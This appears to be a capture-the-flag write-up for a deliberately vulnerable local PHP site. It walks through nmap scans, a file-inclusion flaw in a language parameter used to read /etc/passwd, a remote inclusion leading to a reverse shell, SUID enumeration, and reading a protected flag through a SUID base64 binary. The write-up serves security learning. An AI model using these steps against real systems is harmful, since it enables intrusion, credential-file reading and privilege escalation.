# Vulnerable Language Changer

## Reconnaissance

The nmap Scan is present in [this](nmap/) directory:

Nmap Scan with [full port](nmap/allport.nmap) scan:

```
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-09 12:18 +0545
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000045s latency).
Other addresses for localhost (not scanned): ::1
Not shown: 65533 closed tcp ports (conn-refused)
PORT      STATE SERVICE
80/tcp    open  http
38203/tcp open  agpolicy

Nmap done: 1 IP address (1 host up) scanned in 0.71 seconds
```

Nmap with [Aggressive Port Scan](nmap/aggressive.nmap):

```
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-09 12:19 +0545
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000096s latency).
Other addresses for localhost (not scanned): ::1

PORT      STATE SERVICE   VERSION
80/tcp    open  http      nginx 1.23.2
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: nginx/1.23.2
38203/tcp open  agpolicy?
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 Not Found
|     Date: Wed, 09 Nov 2022 06:35:03 GMT
|     Content-Length: 19
|     Content-Type: text/plain; charset=utf-8
|     404: Page Not Found
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 404 Not Found
|     Date: Wed, 09 Nov 2022 06:34:38 GMT
|     Content-Length: 19
|     Content-Type: text/plain; charset=utf-8
|_    404: Page Not Found
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port38203-TCP:V=7.92%I=7%D=11/9%Time=636B49FE%P=x86_64-pc-linux-gnu%r(G
SF:enericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20
SF:text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\
SF:x20Request")%r(GetRequest,8F,"HTTP/1\.0\x20404\x20Not\x20Found\r\nDate:
SF:\x20Wed,\x2009\x20Nov\x202022\x2006:34:38\x20GMT\r\nContent-Length:\x20
SF:19\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\n\r\n404:\x20Page
SF:\x20Not\x20Found")%r(HTTPOptions,8F,"HTTP/1\.0\x20404\x20Not\x20Found\r
SF:\nDate:\x20Wed,\x2009\x20Nov\x202022\x2006:34:38\x20GMT\r\nContent-Leng
SF:th:\x2019\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\n\r\n404:\
SF:x20Page\x20Not\x20Found")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20
SF:Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:
SF:\x20close\r\n\r\n400\x20Bad\x20Request")%r(Help,67,"HTTP/1\.1\x20400\x2
SF:0Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nCon
SF:nection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(SSLSessionReq,67,"HT
SF:TP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20cha
SF:rset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(Ter
SF:minalServerCookie,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Typ
SF:e:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x
SF:20Bad\x20Request")%r(TLSSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Reque
SF:st\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20c
SF:lose\r\n\r\n400\x20Bad\x20Request")%r(Kerberos,67,"HTTP/1\.1\x20400\x20
SF:Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConn
SF:ection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(FourOhFourRequest,8F,
SF:"HTTP/1\.0\x20404\x20Not\x20Found\r\nDate:\x20Wed,\x2009\x20Nov\x202022
SF:\x2006:35:03\x20GMT\r\nContent-Length:\x2019\r\nContent-Type:\x20text/p
SF:lain;\x20charset=utf-8\r\n\r\n404:\x20Page\x20Not\x20Found")%r(LPDStrin
SF:g,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain
SF:;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request
SF:")%r(LDAPSearchReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Ty
SF:pe:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\
SF:x20Bad\x20Request");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 87.46 seconds
```

## Vulnerability Analysis:

From the nmap scan above, port 80 is found to be open. Looking at port 80, there was a site.

At the top right corner, found a button which could be used to change the language of the site. While changing the language, noticed the url which was like

`http://localhost/rfi.php?lang=lang%2Fhindi.php`. Since this was including the php file from the path `lang/hindi.php`, this can probably lead to Local File Inclusion(LFI). Tried changing the path to `/etc/passwd` and voila, there was a LFI vuln here, since it returned the contents of the `/etc/passwd` file.


Changing the path to `http://google.com` to observer if it was only LFI or was also Remote File Inclusion(RFI). And there was the response from `http://google.com`.

- Local File Inclusion/ Remote File Inclusion in the server leading to Remote Code Execution

## Exploitation
Since this was a RFI, we could easily get a php payload to execute in the server, since this server was running on php.

Getting a payload from pentest monkey for reverse shell of php, and listening on nc to the port. Received a reverse shell connection from the server.

used `echo $0` to find that it was running a `sh` shell. Used `which bash` to find that there was also a bash shell. `/bin/bash -i` to get an interactive bash shell.


Found the first flag as userFlag.

Used `find / -name "*lag.txt" 2>/dev/null` to find where the flags are located. Result:

```
www-data@17b27ada25da:/$ find / -name "*lag.txt" 2>/dev/null
find / -name "*lag.txt" 2>/dev/null
/home/prithivi/finalFlag.txt
/userFlag.txt
```

The `/home/prithivi/finalFlag.txt` has read permissions from user `prithivi` only so a privilege escalation to user prithivi was required.

Used `find / -perm /4000 2>/dev/null` to list the executable files with Set-UID permissions which listed:

```
/bin/umount
/bin/su
/bin/mount
/usr/bin/gpasswd
/usr/bin/base64
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/passwd
```

From GTFOBins, found that base64 could be able to escalate privileges. Base64 was owned by user `prithivi` so this binary looked suspicious.

Finally, tried `base64 /home/prithivi/finalFlag.txt | base64 --decode` which was able to get the final flag.

This command simply used the permissions of user `prithivi` to encode the contents of the file and finally decode it. Since the binary of `base64` uses the permission of user prithivi, it can read the contents of the file `finalFlag.txt`.

